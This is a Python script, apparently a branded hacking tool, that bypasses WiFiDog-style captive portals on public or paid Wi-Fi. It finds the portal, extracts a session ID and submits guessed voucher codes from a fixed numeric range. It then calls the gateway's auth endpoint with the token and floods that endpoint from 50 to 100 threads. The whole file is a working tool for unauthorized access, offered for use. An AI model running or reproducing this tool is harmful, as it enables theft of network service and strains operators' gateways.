import requests, re, urllib3, time, threading, os, random, subprocess, json, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_NAME = "🇵🇾 PEKIN 🇵🇾"
EXP_DATE = "LIFETIME"
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def banner():
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[96m" + """
     ██████╗ ███████╗██╗  ██╗██╗███╗   ██╗
     ██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║
     ██████╔╝█████╗  █████╔╝ ██║██╔██╗ ██║
     ██╔═══╝ ██╔══╝  ██╔═██╗ ██║██║╚██╗██║
     ██║     ███████╗██║  ██╗██║██║ ╚████║
     ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝""")
    print(f"\033[95m 👑 USER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE} | \033[94m🆔: {get_uid()}")
    print("\033[93m ="*38 + "\033[0m")

def turbo_pulse(link, mode):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] 🇵🇾 PEKIN 🇵🇾 | Pulse OK >>> [{random.randint(20,50)}ms]\033[0m")
            time.sleep(0.02 if mode == "1" else 0.08)
        except: time.sleep(1)

def launch():
    banner()
    print("\n\033[93m [ Choose Mode ]\n\033[92m [1] 🚀 PEKIN-Turbo\n\033[94m [2] 🔋 PEKIN-Eco")
    choice = input("\033[97m\n [?] Select (1/2): ")
    thread_count = 100 if choice == "1" else 50
    banner()
    session = requests.Session()
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            parsed = urlparse(p_url)
            query = parse_qs(parsed.query)
            gw = query.get('gw_address', [parsed.netloc.split(':')[0]])[0]
            port = query.get('gw_port', ['2060'])[0]
            r1 = session.get(p_url, verify=False, timeout=6)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=6)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                v_code = random.choice(VOUCHER_LIST)
                session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                print(f"\033[95m[*] ⚡ PEKIN.PY BYPASS SUCCESS ⚡\033[0m")
                for _ in range(thread_count):
                    threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                while True:
                    time.sleep(5)
                    if requests.get("http://www.google.com/generate_204", timeout=3).status_code != 204: break
            time.sleep(2)
        except: time.sleep(2)

if __name__ == "__main__":
    launch()
          
